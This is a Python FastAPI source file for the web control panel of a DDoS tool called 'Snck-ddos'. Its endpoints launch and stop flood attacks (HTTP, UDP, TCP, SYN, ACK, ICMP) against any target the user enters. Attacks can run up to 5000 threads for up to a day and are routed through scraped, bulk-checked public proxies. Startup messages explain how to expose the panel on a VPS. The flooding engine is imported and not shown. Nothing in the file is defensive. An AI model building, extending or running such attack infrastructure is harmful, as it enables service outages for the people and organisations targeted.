# language: Python 3.11+, file: web/app.py, target: port 6666
"""Snck-ddos web control panel — FastAPI on :6666."""

from __future__ import annotations

import traceback
from pathlib import Path

from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
from pydantic import BaseModel, Field

ROOT = Path(__file__).resolve().parent.parent
STATIC = ROOT / "static"
TEMPLATE_DIR = ROOT / "web" / "templates"
TEMPLATE_FILE = TEMPLATE_DIR / "index.html"

app = FastAPI(title="Snck-ddos", docs_url=None, redoc_url=None)

# static is optional — never crash startup if folder missing
try:
    STATIC.mkdir(parents=True, exist_ok=True)
    from fastapi.staticfiles import StaticFiles
    app.mount("/static", StaticFiles(directory=str(STATIC)), name="static")
except Exception as e:
    print("[warn] static mount skipped:", e)

# engine import — soft-fail so / still answers
_engine_err = None
try:
    from core.engine import engine, AttackConfig
    from core.proxy import scrape_proxies, check_batch, load_proxies, save_proxies
except Exception as e:
    engine = None  # type: ignore
    AttackConfig = None  # type: ignore
    _engine_err = f"{type(e).__name__}: {e}"
    print("[error] core import failed:", _engine_err)
    traceback.print_exc()

PROXY_FILE = ROOT / "proxies.txt"
LIVE_PROXY_FILE = ROOT / "live_proxies.txt"

FALLBACK_HTML = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Snck-ddos</title>
<style>body{font-family:monospace;background:#0a0a0c;color:#e4e4e7;padding:2rem}
a{color:#e11d48}</style></head>
<body>
<h1>SNCK-ddos</h1>
<p>Panel template missing or failed to load.</p>
<p>API health: <a href="/health">/health</a> · stats: <a href="/api/stats">/api/stats</a></p>
<p>Fix: ensure web/templates/index.html exists, then restart.</p>
</body></html>"""


class StartBody(BaseModel):
    target: str = Field(..., min_length=4)
    method: str = "GET"
    threads: int = Field(200, ge=1, le=5000)
    duration: int = Field(60, ge=5, le=86400)
    payload_size: int = Field(1024, ge=64, le=65535)
    use_proxies: bool = True


@app.get("/health")
async def health():
    return {
        "ok": True,
        "engine": _engine_err is None,
        "engine_error": _engine_err,
        "template": TEMPLATE_FILE.is_file(),
        "root": str(ROOT),
    }


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    if TEMPLATE_FILE.is_file():
        try:
            from fastapi.templating import Jinja2Templates
            templates = Jinja2Templates(directory=str(TEMPLATE_DIR))
            return templates.TemplateResponse("index.html", {"request": request})
        except Exception as e:
            return HTMLResponse(
                FALLBACK_HTML + f"<!-- template error: {e} -->",
                status_code=200,
            )
    return HTMLResponse(FALLBACK_HTML, status_code=200)


@app.get("/api/stats")
async def stats():
    if engine is None:
        return {"running": False, "error": _engine_err or "engine missing", "requests": 0, "rps": 0, "mbps": 0, "errors": 0, "active_workers": 0, "uptime": 0}
    s = engine.stats
    return {
        "running": s.running,
        "method": s.method,
        "target": s.target,
        "threads": s.threads,
        "requests": s.requests,
        "bytes_sent": s.bytes_sent,
        "errors": s.errors,
        "active_workers": s.active_workers,
        "rps": round(s.rps(), 1),
        "mbps": round(s.mbps(), 2),
        "uptime": round(max(0, __import__("time").time() - s.started), 1) if s.running or s.requests else 0,
    }


@app.post("/api/start")
async def start_attack(body: StartBody, bg: BackgroundTasks):
    if engine is None or AttackConfig is None:
        return JSONResponse({"ok": False, "error": _engine_err or "engine not loaded"}, status_code=500)
    if engine.stats.running:
        return JSONResponse({"ok": False, "error": "attack already running"}, status_code=400)

    proxies: list[str] = []
    if body.use_proxies:
        try:
            proxies = load_proxies(LIVE_PROXY_FILE)
            if not proxies:
                proxies = load_proxies(PROXY_FILE)
        except Exception:
            proxies = []

    target = body.target.strip()
    if not target.startswith(("http://", "https://")) and body.method.upper() not in ("UDP", "TCP", "SYN", "ACK", "CPS", "ICMP"):
        target = "http://" + target

    cfg = AttackConfig(
        target=target,
        method=body.method.upper(),
        threads=body.threads,
        duration=body.duration,
        proxies=[f"http://{p}" for p in proxies] if proxies else [],
        payload_size=body.payload_size,
    )

    async def _run():
        await engine.start(cfg)

    bg.add_task(_run)
    return {"ok": True, "message": "attack started", "proxies": len(proxies)}


@app.post("/api/stop")
async def stop_attack():
    if engine is None:
        return {"ok": False, "error": "engine not loaded"}
    await engine.stop()
    return {"ok": True}


@app.post("/api/scrape")
async def api_scrape(bg: BackgroundTasks):
    if engine is None:
        return JSONResponse({"ok": False, "error": "proxy module not loaded"}, status_code=500)

    async def _job():
        raw = await scrape_proxies()
        save_proxies(raw, PROXY_FILE)
        live = await check_batch(raw, concurrency=400)
        save_proxies(live, LIVE_PROXY_FILE)

    bg.add_task(_job)
    return {"ok": True, "message": "scrape + check started in background"}


@app.get("/api/proxies")
async def api_proxies():
    try:
        raw = load_proxies(PROXY_FILE)
        live = load_proxies(LIVE_PROXY_FILE)
        return {"raw": len(raw), "live": len(live)}
    except Exception:
        return {"raw": 0, "live": 0}


def run(host: str = "0.0.0.0", port: int = 6666) -> None:
    import uvicorn
    print(f"[*] binding http://{host}:{port}")
    print(f"[*] open http://YOUR_VPS_IP:{port}  (not about:blank)")
    print(f"[*] health check: http://YOUR_VPS_IP:{port}/health")
    print(f"[*] if phone shows blank: open firewall port {port}/tcp")
    # pass app object directly — avoids import-string path issues on some VPS layouts
    uvicorn.run(
        app,
        host=host,
        port=port,
        log_level="info",
        workers=1,
    )


if __name__ == "__main__":
    run()
